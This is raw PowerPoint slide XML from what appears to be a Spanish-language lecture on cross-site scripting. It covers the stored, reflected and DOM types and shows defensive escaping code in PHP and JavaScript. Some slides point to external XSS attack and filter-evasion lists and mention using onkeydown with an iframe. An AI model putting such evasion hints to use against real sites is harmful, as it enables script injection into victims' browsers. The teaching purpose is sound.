                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>XSS permite a los atacantes ejecutar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>scripts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> en el navegador de internet de la víctima</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A44013C1-6896-B3E3-763F-72861780C04E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3216348" y="2549479"/>
            <a:ext cx="7173326" cy="3248478"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1051330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27991" y="109434"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inyección XSS</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="327991" y="728839"/>
            <a:ext cx="7477403" cy="508452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514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0"/>
              <a:t>Almacenado</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>son aquellos en los que el script inyectado se guarda en el servidor destino, como en una base de datos, en un foro de mensajes, campo de comentarios, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>DOM (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Document</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Model</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> - API que permite ejecutar código en el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>frontend</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> web)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>En la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>siguiente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> URL podemos encontrar una gran base de datos de posibles ataques. Por ejemplo, para </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>iframe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> puedes usar el evento </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>onkeydown</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>Podemos encontrar una lista de evasión de filtros XSS en el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>siguiente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> enlace</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60297E73-225C-7F4D-B50F-B9BA7A021552}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7875432" y="1206248"/>
            <a:ext cx="4112224" cy="1750675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6" descr="Interfaz de usuario gráfica&#10;&#10;Descripción generada automáticamente con confianza media">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9CEB318-3589-B79F-3639-1B74786A76A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5637228" y="3589415"/>
            <a:ext cx="6420465" cy="3204193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="233588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27991" y="109434"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inyección XSS</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="752197" y="1749909"/>
            <a:ext cx="9343950" cy="21999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514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0"/>
              <a:t>Reflejado</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>son aquellos en los que el script inyectado se incluye dentro de la URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> (se combina con ingeniería social)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>Almacenado (Guardado en </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>backend</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>DOM (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Document</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Model</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> - API que permite ejecutar código en el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>frontend</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> web)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4FEA0560-2047-4057-CBFA-1EDB40E22FF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="511405" y="993235"/>
            <a:ext cx="10140884" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>XSS permite a los atacantes ejecutar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>scripts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> en el navegador de internet de la víctima</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A44013C1-6896-B3E3-763F-72861780C04E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3668834" y="2436357"/>
            <a:ext cx="7173326" cy="3248478"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="470942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412832" y="83952"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevención XSS – Controles de entrada</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="312562" y="984838"/>
            <a:ext cx="10857190" cy="94896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57150"/>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0"/>
              <a:t>Escapar caracteres especiales</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>: Algunos caracteres especiales, como &lt;, &gt; y &amp;, pueden ser explotados por un atacante para insertar código malicioso. Para evitar esto, puede escapar estos caracteres utilizando una función como </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> en PHP o escape en JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B115FA1-97E1-68F9-0C8C-F6FD3E1ABBB8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="312562" y="1982458"/>
            <a:ext cx="6094428" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en PHP:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="CuadroTexto 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{927F2DB6-9D3E-1451-EAF2-1F4F921BD61C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2861566" y="2045057"/>
            <a:ext cx="6094428" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>$nombre = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>($_POST['nombre']);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="CuadroTexto 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C477596D-CB40-1AD2-6AD5-FC3319CA4CD3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="312562" y="2782669"/>
            <a:ext cx="6094428" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en JavaScript:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="CuadroTexto 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42B29A4C-48AD-FC03-73F0-3FAC640A4714}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2861566" y="2988280"/>
            <a:ext cx="6742505" cy="3385542"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>escapeHtml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>map</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t> = {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>    '&amp;': '&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>amp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>;',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>    '&lt;': '&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>lt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>;',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>    '&gt;': '&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>;',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>    '"': '&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>quot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>;',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>    "'": '&amp;#039;'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>  };</a:t>
            </a:r>
          </a:p>
          <a:p>
